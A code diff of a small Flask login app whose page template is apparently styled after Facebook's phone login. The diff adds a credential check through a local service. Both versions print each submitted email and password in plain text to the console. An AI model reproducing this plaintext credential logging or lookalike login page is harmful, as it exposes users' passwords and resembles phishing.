@@ -1,18 +1,22 @@
 from flask import Flask, request, render_template
+from services import checkUsernameAndPassword
 
 app = Flask(__name__)
 
-@app.route('/')
+@app.route('/')  
 def index():
-    return render_template("siteFacebookPHoneDesigne.html")
-
+    error = False
+    return render_template("siteFacebookPHoneDesigne.html",error = error)
+    
 @app.route('/',  methods=['POST'])
 def login():
+    error = True
     email = request.form.get('email')
     password = request.form.get('password')
     print(email)
     print(password)
-    return render_template("Welcome.html" ,email_t=email ,password_t=password)
+    return render_template("gold-site.html")  if checkUsernameAndPassword(email, password) else render_template("siteFacebookPHoneDesigne.html" , error = error)
+
 
 # @app.route('/',methods=['GET'])
 # def index():
